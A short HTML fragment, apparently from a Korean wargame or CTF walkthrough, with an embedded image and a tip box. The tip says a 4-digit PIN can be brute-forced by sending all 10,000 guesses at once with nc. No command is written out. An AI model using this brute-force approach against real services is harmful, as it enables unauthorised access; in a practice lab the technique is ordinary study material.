  <img src="https://blog.kakaocdn.net/dna/b7TwRk/dJMcafTXTWq/AAAAAAAAAAAAAAAAAAAAAM2xuq9WPWgP3kY_hoij6WcsUAlB0Xx7YImxGPp4V892/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=VWw%2FX4qpbS7v6Ye1rv97iGL0PEg%3D" loading="lazy" alt="">
</div>
  <div class="bw-tip">4자리 PIN(0000~9999) 전수 조사 — nc로 한 번에 몰아 보내면 빠르게 끝남.</div>
</div>

</div>

